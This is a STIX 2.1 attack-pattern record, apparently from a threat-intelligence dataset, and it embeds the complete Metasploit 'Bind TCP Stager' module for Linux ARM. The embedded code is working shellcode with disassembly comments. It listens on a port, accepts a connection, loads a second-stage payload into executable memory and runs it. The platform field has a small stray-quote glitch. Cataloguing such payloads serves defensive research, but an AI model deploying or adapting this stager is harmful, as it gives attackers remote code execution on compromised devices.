{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--75a2b560-4741-463a-b9cc-7332914b17ae",
    "created": "2024-08-14T16:33:19.523087Z",
    "modified": "2024-08-14T16:33:19.523091Z",
    "name": "Bind TCP Stager",
    "description": "Listen for a connection",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/linux/armle/bind_tcp.rb",
            "external_id": "bind_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n###\n#\n# BindTcp\n# -------\n#\n# Linux bind TCP stager.\n#\n###\nmodule MetasploitModule\n\n  CachedSize = 232\n\n  include Msf::Payload::Stager\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Bind TCP Stager',\n      'Description'   => 'Listen for a connection',\n      'Author'        => 'nemo <nemo[at]felinemenace.org>',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_ARMLE,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Stager'        =>\n        {\n          'Offsets' =>\n            {\n              'LPORT' => [ 214, 'n'    ],\n            },\n          'Payload' =>\n          [\n            0xe59f70d4,           # ldr     r7, [pc, #212]\n            0xe3a00002,           # mov     r0, #2\n            0xe3a01001,           # mov     r1, #1\n            0xe3a02006,           # mov     r2, #6\n            0xef000000,           # svc     0x00000000\n            0xe1a0c000,           # mov     ip, r0\n            0xe2877001,           # add     r7, r7, #1\n            0xe28f10b0,           # add     r1, pc, #176\n            0xe3a02010,           # mov     r2, #16\n            0xef000000,           # svc     0x00000000\n            0xe2877002,           # add     r7, r7, #2\n            0xe1a0000c,           # mov     r0, ip\n            0xef000000,           # svc     0x00000000\n            0xe2877001,           # add     r7, r7, #1\n            0xe1a0000c,           # mov     r0, ip\n            0xe0411001,           # sub     r1, r1, r1\n            0xe1a02001,           # mov     r2, r1\n            0xef000000,           # svc     0x00000000\n            0xe1a0c000,           # mov     ip, r0\n            0xe24dd004,           # sub     sp, sp, #4\n            0xe2877006,           # add     r7, r7, #6\n            0xe1a0100d,           # mov     r1, sp\n            0xe3a02004,           # mov     r2, #4\n            0xe3a03000,           # mov     r3, #0\n            0xef000000,           # svc     0x00000000\n            0xe59d1000,           # ldr     r1, [sp]\n            0xe59f3070,           # ldr     r3, [pc, #112]\n            0xe0011003,           # and     r1, r1, r3\n            0xe3a02001,           # mov     r2, #1\n            0xe1a02602,           # lsl     r2, r2, #12\n            0xe0811002,           # add     r1, r1, r2\n            0xe3a070c0,           # mov     r7, #192\n            0xe3e00000,           # mvn     r0, #0\n            0xe3a02007,           # mov     r2, #7\n            0xe59f3054,           # ldr     r3, [pc, #84]\n            0xe1a04000,           # mov     r4, r0\n            0xe3a05000,           # mov     r5, #0\n            0xef000000,           # svc     0x00000000\n            0xe2877063,           # add     r7, r7, #99\n            0xe1a01000,           # mov     r1, r0\n            0xe1a0000c,           # mov     r0, ip\n            0xe3a03000,           # mov     r3, #0\n            0xe59d2000,           # ldr     r2, [sp]\n            0xe2422ffa,           # sub     r2, r2, #1000\n            0xe58d2000,           # str     r2, [sp]\n            0xe3520000,           # cmp     r2, #0\n            0xda000002,           # ble     811c <last>\n            0xe3a02ffa,           # mov     r2, #1000\n            0xef000000,           # svc     0x00000000\n            0xeafffff7,           # b       80fc <loop>\n            0xe2822ffa,           # add     r2, r2, #1000\n            0xef000000,           # svc     0x00000000\n            0xe1a0f001,           # mov     pc, r1\n            0x5c110002,           # .word   0x5c110002\n            0x00000000,           # .word   0x00000000\n            0x00000119,           # .word   0x00000119\n            0xfffff000,           # .word   0xfffff000\n            0x00001022            # .word   0x00001022\n          ].pack(\"V*\")\n\n        }\n      ))\n  end\n\n  def handle_intermediate_stage(conn, payload)\n\n    print_status(\"Transmitting stage length value...(#{payload.length} bytes)\")\n\n    address_format = 'v'\n\n    # Transmit our intermediate stager\n    conn.put( [ payload.length ].pack(address_format) )\n\n    return true\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}